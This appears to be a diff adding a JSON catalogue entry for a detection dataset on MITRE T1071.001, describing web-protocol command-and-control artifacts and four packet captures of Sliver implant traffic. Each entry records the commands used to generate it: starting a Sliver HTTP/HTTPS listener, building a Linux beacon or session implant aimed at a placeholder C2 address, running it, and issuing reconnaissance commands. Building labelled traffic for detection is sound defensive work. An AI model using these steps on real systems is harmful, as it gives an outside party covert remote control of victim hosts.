@@ -1,0 +1,136 @@
+{
+  "mitre": {
+    "technique_id": "T1071.001",
+    "technique_name": "Application Layer Protocol: Web Protocols",
+    "url": "https://attack.mitre.org/techniques/T1071/001/",
+    "tactics": ["TA0011"]
+  },
+  "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
+  "artifacts": [
+    "outbound HTTP / HTTPS connections to a controlled C2 server (non-corporate IP, non-CDN)",
+    "periodic beaconing pattern (regular interval requests with similar size/timing) characteristic of beacon mode implants",
+    "long-lived HTTP/HTTPS sessions with sustained bidirectional traffic (interactive session mode)",
+    "User-Agent strings consistent with sliver default profiles (e.g. Mozilla/5.0 ... Chrome/...)",
+    "POST requests carrying base64 / encrypted command output in the body",
+    "GET requests retrieving tasks / commands from the C2",
+    "TLS handshake with self-signed or short-validity certificates on HTTPS variants",
+    "JA3 / JA3S fingerprints matching known sliver profiles",
+    "command execution results visible in clear-text (HTTP variant) inside POST request/response bodies",
+    "Linux command output patterns (whoami, hostname, uname -a, id, ps aux) inside C2 traffic"
+  ],
+  "datasets": {
+    "pcaps": [
+      {
+        "id": "t1071.001-internal-http-c2-beacon-linux-sliver",
+        "file": "pcaps/techniques/t1071.001/t1071.001_internal_http_c2_beacon_linux__sliver.pcap",
+        "name": "Internal HTTP C2 beacon Linux - sliver",
+        "description": "Internal C2 traffic from a Linux sliver implant operating in beacon mode over plain HTTP, showing periodic check-in requests to the controlled C2 server. Beacon mode is characterized by regular polling intervals rather than persistent connections.",
+        "criticality": "critical",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [8080]
+        },
+        "filter": [
+          "internal",
+          "http",
+          "c2",
+          "command-and-control",
+          "beacon",
+          "linux",
+          "sliver",
+          "implant",
+          "tcp",
+          "8080",
+          "critical"
+        ],
+        "command": "# server: sliver-server then `http --lport 8080` listener\n# implant: generate beacon --http <c2-ip> --os linux --arch amd64\n# target: ./sliver_implant"
+      },
+      {
+        "id": "t1071.001-internal-http-c2-session-linux-sliver",
+        "file": "pcaps/techniques/t1071.001/t1071.001_internal_http_c2_session_linux__sliver.pcap",
+        "name": "Internal HTTP C2 interactive session Linux - sliver",
+        "description": "Internal C2 traffic from a Linux sliver implant operating in interactive session mode over plain HTTP, showing sustained bidirectional command/response traffic for reconnaissance commands (whoami, hostname, uname -a, id, ps aux) executed from the sliver client.",
+        "criticality": "critical",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [8080]
+        },
+        "filter": [
+          "internal",
+          "http",
+          "c2",
+          "command-and-control",
+          "session",
+          "interactive",
+          "linux",
+          "sliver",
+          "implant",
+          "recon",
+          "tcp",
+          "8080",
+          "critical"
+        ],
+        "command": "# server: sliver-server then `http --lport 8080` listener\n# implant: generate --http <c2-ip> --os linux --arch amd64\n# target: ./sliver_implant\n# operator (sliver client): use <session>; execute whoami; execute hostname; execute uname -a; execute id; execute ps aux"
+      },
+      {
+        "id": "t1071.001-internal-https-c2-beacon-linux-sliver",
+        "file": "pcaps/techniques/t1071.001/t1071.001_internal_https_c2_beacon_linux__sliver.pcap",
+        "name": "Internal HTTPS C2 beacon Linux - sliver",
+        "description": "Internal C2 traffic from a Linux sliver implant operating in beacon mode over HTTPS, showing periodic TLS-encrypted check-in requests to the controlled C2 server. Payload is opaque due to TLS but periodicity and JA3/server cert remain visible.",
+        "criticality": "critical",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [8081]
+        },
+        "filter": [
+          "internal",
+          "https",
+          "tls",
+          "c2",
+          "command-and-control",
+          "beacon",
+          "linux",
+          "sliver",
+          "implant",
+          "tcp",
+          "8081",
+          "critical"
+        ],
+        "command": "# server: sliver-server then `https --lport 8081` listener\n# implant: generate beacon --https <c2-ip> --os linux --arch amd64\n# target: ./sliver_implant"
+      },
+      {
+        "id": "t1071.001-internal-https-c2-session-linux-sliver",
+        "file": "pcaps/techniques/t1071.001/t1071.001_internal_https_c2_session_linux__sliver.pcap",
+        "name": "Internal HTTPS C2 interactive session Linux - sliver",
+        "description": "Internal C2 traffic from a Linux sliver implant operating in interactive session mode over HTTPS, showing sustained TLS-encrypted bidirectional command/response traffic for reconnaissance commands (whoami, hostname, uname -a, id, ps aux) executed from the sliver client.",
+        "criticality": "critical",
+        "scope": {
+          "protocol": "tcp",
+          "ports": [8081]
+        },
+        "filter": [
+          "internal",
+          "https",
+          "tls",
+          "c2",
+          "command-and-control",
+          "session",
+          "interactive",
+          "linux",
+          "sliver",
+          "implant",
+          "recon",
+          "tcp",
+          "8081",
+          "critical"
+        ],
+        "command": "# server: sliver-server then `https --lport 8081` listener\n# implant: generate --https <c2-ip> --os linux --arch amd64\n# target: ./sliver_implant\n# operator (sliver client): use <session>; execute whoami; execute hostname; execute uname -a; execute id; execute ps aux"
+      }
+    ]
+  },
+  "metadata": {
+    "domain": "enterprise",
+    "confidence": "high",
+    "schema_version": "1.0"
+  }
+}
